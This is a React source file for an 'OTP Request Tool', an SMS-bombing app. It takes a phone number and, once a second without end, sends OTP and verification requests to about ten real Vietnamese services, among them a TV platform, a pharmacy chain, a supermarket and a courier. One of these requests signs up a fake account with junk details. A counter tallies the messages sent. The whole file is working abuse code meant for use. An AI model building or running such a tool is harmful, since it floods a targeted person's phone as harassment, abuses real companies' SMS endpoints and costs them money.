import { useState, useRef } from 'react';
import axios from 'axios';
import { Input, Button, message, Space, Typography, Form, Row, Col, Card, Statistic } from 'antd';
import { ArrowUpOutlined, ArrowDownOutlined } from '@ant-design/icons';
import './App.css';

const { Title } = Typography;

function App() {
  const [sdt, setSdt] = useState('');
  const [count, setCount] = useState(0);
  const [countE, setCountE] = useState(0);
  const intervalRef = useRef(null);
  const [isLoading, setIsLoading] = useState(false)

  const sendOtpRequest = async (sdt) => {
    const requests = [
      axios.post('https://tv360.vn/public/v1/auth/get-otp-login', { msisdn: sdt }),
      axios.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', {
        phoneNumber: sdt,
        otpType: 0,
        fromSys: 'WEBKHLC'
      }),
      axios.post('https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification', {
        phoneNumber: sdt,
        messageCode: 'phone-verification.message_sent'
      }),
      axios.post('https://medicare.vn/api/otp', {
        mobile: sdt,
        mobile_country_prefix: '84'
      }),
      axios.post('https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp', {
        username: sdt,
        case: 'register'
      }),
      axios.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', {
        phone: sdt,
        type: 'register'
      }),
      axios.post('https://tfs-api.hsv-tech.io/client/phone-verification/request-verification', {
        phoneNumber: sdt
      }),
      axios.post('https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send', { phone: sdt }),
      axios.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', {
        phone_number: sdt,
        name: 'Huu fsdf',
        password: 'dfsdfdsf23432',
        email: 'callme@ggg.vom',
        birthday: '2008-02-01',
        gender: 'female'
      }),
      axios.post('https://api.vato.vn/api/authenticate/request_code', {
        phoneNumber: sdt,
        deviceId: 'c5dbb970-edb4-4b6a-a347-3582dd115e67',
        use_for: 'LOGIN'
      })
    ];

    const results = await Promise.allSettled(requests);

    results.forEach((result, index) => {
      if (result.status === 'fulfilled') {
        console.log(`API ${index + 1} succeeded:`, result.value.data);
        setCount(prevCount => prevCount + 1);
      } else {
        console.error(`API ${index + 1} failed:`, result.reason);
        setCountE(prevCount => prevCount + 1);
      }
    });
  };

  const handleRunInfinite = () => {
    message.success('Running');
    setIsLoading(true)
    setCount(0);
    intervalRef.current = setInterval(() => {
      sendOtpRequest(sdt);
    }, 1000); // Chạy mỗi giây
  };

  const handleStopInfinite = () => {
    message.success('Stopped successfully');
    setIsLoading(false)
    clearInterval(intervalRef.current);
  };

  return (
    <div style={{ padding: 20 }}>
      <Title level={3}>OTP Request Tool</Title>
      <Form direction="vertical" onFinish={handleRunInfinite}>
        <Row gutter={[16, 16]}>
          <Col span={24}>
            <Form.Item
              name="phoneNumber"
              rules={[{ required: true, message: 'Please enter a phone number' }]}
            >
              <Input
                type="text"
                value={sdt}
                onChange={(e) => setSdt(e.target.value)}
                placeholder="Enter phone number"
                style={{ width: 300 }}
              />
            </Form.Item>
          </Col>
          <Col span={24}>
            <Form.Item>
              <Button
                loading={isLoading}
                style={{ margin: '10px' }}
                type="default"
                htmlType="submit"
              >
                Run infinitely
              </Button>
              <Button style={{ margin: '10px' }} danger={true} onClick={handleStopInfinite}>Stop</Button>
            </Form.Item>
          </Col>
          <Col span={12}>
            <Card bordered={false}>
              <Statistic
                title="Success"
                value={count}
                precision={0}
                valueStyle={{
                  color: '#3f8600',
                }}
                prefix={<ArrowUpOutlined />}
                suffix="SMS"
              />
            </Card>
          </Col>
          <Col span={12}>
            <Card bordered={false}>
              <Statistic
                title="Error"
                value={countE}
                precision={0}
                valueStyle={{
                  color: '#cf1322',
                }}
                prefix={<ArrowDownOutlined />}
                suffix="SMS"
              />
            </Card>
          </Col>
        </Row>
      </Form>
    </div>
  );
}

export default App;
